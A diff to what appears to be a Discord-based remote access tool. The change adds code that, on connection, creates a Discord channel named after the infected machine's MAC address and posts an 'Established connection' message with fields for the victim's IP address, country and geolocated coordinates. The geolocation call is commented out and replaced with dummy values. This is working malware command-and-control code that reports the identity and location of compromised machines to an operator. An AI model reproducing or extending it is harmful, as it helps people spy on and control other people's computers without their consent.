@@ -19,6 +19,7 @@ import subprocess
 import pyautogui
 import numpy as np
 import subprocess
+import geocoder
 
 import pyaudio
 
@@ -75,6 +76,47 @@ intents.members = True
 client = discord.Client(intents=intents)
 
 
+
+async def first_message(channel,latitude,longitude):
+    embed = discord.Embed(title="**Established connection**",
+                      colour=0x36393f,
+                      timestamp=datetime.now())
+
+    embed.set_author(name="Star my Github",
+                 url="https://github.com/isaaclins/SlytherCord",
+                 icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
+
+    embed.add_field(name="**IP Adress:**",
+                    value="```{ip_address}```",
+                    inline=True)
+    embed.add_field(name="**Country:**",
+                    value="```{country}```",
+                    inline=True)
+    embed.add_field(name="ㅤ",
+                    value="ㅤ",
+                    inline=True)
+    embed.add_field(name="**Latitude:**",
+                    value=f"```{latitude}```",
+                    inline=True)
+    embed.add_field(name="**Longitude**",
+                    value=f"```{longitude}```",
+                    inline=True)
+
+    embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
+
+    embed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
+
+    embed.set_footer(text="Example Footer",
+                    icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
+
+    await channel.send(embed=embed)
+
+async def get_latitude_longitude():
+    g = geocoder.ip('me')
+    latitude, longitude = g.latlng
+    return latitude, longitude
+
+
 async def find_channel_by_name(guild, channel_name):
     for channel in guild.channels:
         if channel.name == channel_name:
@@ -101,18 +143,18 @@ async def create_channel(guild, mac_address):
 
 @client.event
 async def on_ready():
-
+    #latitude, longitude = get_latitude_longitude()
+    latitude = 4
+    longitude = 5
     guild = client.get_guild(int(guild_id))
     mac_address = str(get_mac())
     print(await find_channel_by_name(guild, mac_address))
     channel = await find_channel_by_name(guild, mac_address)
-    if channel:
-        print("Channel with name {} already exists.".format(mac_address))
-        await channel.send("```" + new_ascii + "```")
-    else:
+    if not channel:
         print("Channel with name {} does not exist. Creating...".format(mac_address))
         channel = await guild.create_text_channel(mac_address)
-        await channel.send("```" + new_ascii + "```")
+        await first_message(channel,latitude,longitude)
+    
 
         
 @client.event
